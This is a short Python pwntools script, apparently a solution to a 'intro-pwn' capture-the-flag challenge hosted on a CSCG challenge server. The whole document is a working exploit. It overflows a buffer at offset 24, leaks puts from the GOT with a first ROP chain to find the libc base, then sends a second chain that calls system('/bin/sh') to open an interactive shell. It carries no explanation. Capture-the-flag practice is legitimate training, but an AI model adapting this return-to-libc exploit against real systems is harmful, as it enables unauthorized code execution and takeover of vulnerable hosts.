#!/usr/bin/env python3

from pwn import *

exe = ELF("./intro-pwn_patched")
libc = ELF("./libc6-x32_2.36-4_amd64.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        # r = remote("addr", 1337)
        host = "2b3e03ad9fbfd024830fa18a-1024-intro-pwn-1.challenge.cscg.live"
        port = 1337

        r = remote(host, port, ssl=True)

    return r


def main():
    r = conn()
    rop = ROP(exe)
    offset = 24
    rop.raw("A" * offset)
    rop.rdi = exe.got['puts']
    rop.raw(exe.plt['puts'])
    rop.raw(exe.sym['main'])
    r.sendline(rop.chain())
    write("payload",rop.chain())
    r.recvuntil(b"I have a present for you: 50015\n")
    leak_puts = u64(r.recvline().strip() + b'\x00\x00')
    log.info(hex(leak_puts))
    libc.address = leak_puts - libc.sym['puts']
    log.info(hex(libc.address))
    ret = 0x0000000000401016
    rop2 = ROP(exe)
    rop2.raw(b"A" * offset)
    rop2.rdi = next(libc.search(b"/bin/sh\x00"))
    rop2.raw(ret)
    rop2.raw(libc.sym['system'])
    r.sendline(rop2.chain())
    write("payload2",rop2.chain())
    r.interactive()
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
